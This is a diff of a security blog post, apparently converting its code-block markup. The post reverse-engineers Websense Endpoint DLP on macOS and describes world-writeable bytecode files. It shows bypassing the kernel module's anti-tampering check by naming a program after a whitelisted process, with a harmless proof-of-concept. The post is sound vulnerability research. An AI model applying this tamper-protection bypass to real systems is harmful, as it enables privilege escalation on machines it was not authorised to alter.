@@ -26,7 +26,7 @@ On Reboot, the jamf installed a bunch of patches and new stuff. I ran the usual 
 
 I found a bunch of files in `/Library/Application Support/Websense Endpoint` and was immediately fascinated, because apparently this installs a complete version of Python 2.5.
 
-{% highlight console %}
+```console
 $ find . -iname python2\*
 ./EPClassifier/python/bin/python2.5
 $ EPClassifier/python/bin/python2.5
@@ -34,25 +34,25 @@ Python 2.6.9 (unknown, Feb  7 2017, 00:08:08)
 [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)] on darwin
 Type "help", "copyright", "credits" or "license" for more information.
 >>>
-{% endhighlight %}
+```
 
 Okay, so they lie about that. It’s 2.6.
 
 On the other hand, they deliver their application as a bunch of `.pyc` (compiled python bytecode) files. 
 
-{% highlight console %}
+```console
 $ find  . -iname \*.pyc
 ./EPClassifier/CryptoInterface.pyc
 ./EPClassifier/policies/file_detectors/ASMDetector.pyc
 ./EPClassifier/policies/file_detectors/CAD_STL.pyc
 ...
-{% endhighlight %}
+```
 
 We can read that, using [uncompyle6](https://github.com/rocky/python-uncompyle6): `brew install python3; pip3 install uncompyle6`, because I am lazy and don’t want to mess with a venv right here and now. 
 
 I’d want that in my path all the time anyway.
 
-{% highlight python %}
+```python
 $ uncompyle6 ./EPClassifier/policies/scripts/pyLogger.pyc
 # uncompyle6 version 3.2.3
 # Python bytecode 2.5 (62131)
@@ -78,22 +78,22 @@ class PyLogger(object):
         log_debug_file.close()
         self.myMutex.release()
 # okay decompiling ./EPClassifier/policies/scripts/pyLogger.pyc
-{% endhighlight %}
+```
 
 ## It's all world-writeable, or is it?
 
 That’s fun, I thought and then I saw the file permissions.
 
-{% highlight console %}
+```console
 $ ls -l ./EPClassifier/policies/scripts/pyLogger.pyc
 -rw-rw-rw-  1 root  admin  1130 Nov 14  2017 ./EPClassifier/policies/scripts/pyLogger.pyc
-{% endhighlight %}
+```
 
 Is it really a good idea to have system security software installed with world-writeable files?
 
 I asked in our internal security forum, and apparently WebSense has an anti-tampering protection. 
 
-{% highlight console %}
+```console
 $ kextstat | grep -v com.apple | awk '{ print $1, $6 }'
 Index Name
 15 com.displaylink.driver.DisplayLinkDriver
@@ -102,25 +102,25 @@ Index Name
 146 com.websense.endpoint.process.kpi
 147 com.websense.endpoint.process
 148 com.websense.endpoint.dlp
-{% endhighlight %}
+```
 
 The number 148, `com.websense.endpoint.dlp`, is the kernel module that "protects" these files: As a user or as root, when you try to modify one of the world writeable files, the module intercepts and blocks the call.
 
-{% highlight console %}
+```console
 com.websense.endpoint.dlp: [WARNING:ws_anti.c:364] Blocking the attempt to modify or delete /Library/Application Support/Websense Endpoint/EPClassifier/python/lib/python2.5/sqlite3/__init__.py, pid:73968, process:vim, action: 0x4
-{% endhighlight %}
+```
 
 Challenge accepted.
 
 ## A kext is just code. Let's have a look.
 
-{% highlight console %}
+```console
 $ pwd
 .../Websense Endpoint/DLP/WebsenseEndpointDLP.kext/Contents/MacOS
 $ ls -l
 total 440
 -rwxr-xr-x  1 kris  staff  223056 Jun  4 23:52 WebsenseEndpointDLP
-{% endhighlight %}
+```
 
 That’s the kext, the one which registers itself as `com.websense.endpoint.dlp` in `kextstat`.
 
@@ -188,7 +188,7 @@ We get privilege escalation from local user to system administrator.
 
 Can I prove that I can circumvent their protection?
 
-{% highlight c %}
+```c
 $ cat probe.c
 #include <stdio.h>
 #include <stdlib.h>
@@ -206,7 +206,7 @@ int main() {
     sleep(60);
     exit(0);
 }
-{% endhighlight %}
+```
 
 This is a slight variation of the “hello world” program: It opens a file version.plist, writes "Hello, world" to the file, sleeps a minute and exits.
 
@@ -214,23 +214,23 @@ First, expected behavior: Boy meets file, file is world writeable, boy tries to 
 
 Hackerterrorcybercyber averted.
 
-{% highlight console %}
+```console
 $ pwd
 /Library/Application Support/Websense Endpoint/EPClassifier/python/Resources
 $ ls -l version.plist 
 -rwxrwxrwx 1 root admin 454 May 26 07:13 version.plist
 $ > version.plist
 -bash: version.plist: Permission denied
-{% endhighlight %}
+```
 
 Boy reverses the kext, reads the list of privileged filenames, names his "hello world" program kvoop from the list of privileged filenames and lo and behold:
 
-{% highlight console %}
+```console
 $ kvoop
 ^C
 $ cat version.plist
 Hello, world
-{% endhighlight %}
+```
 
 I pwn.
 
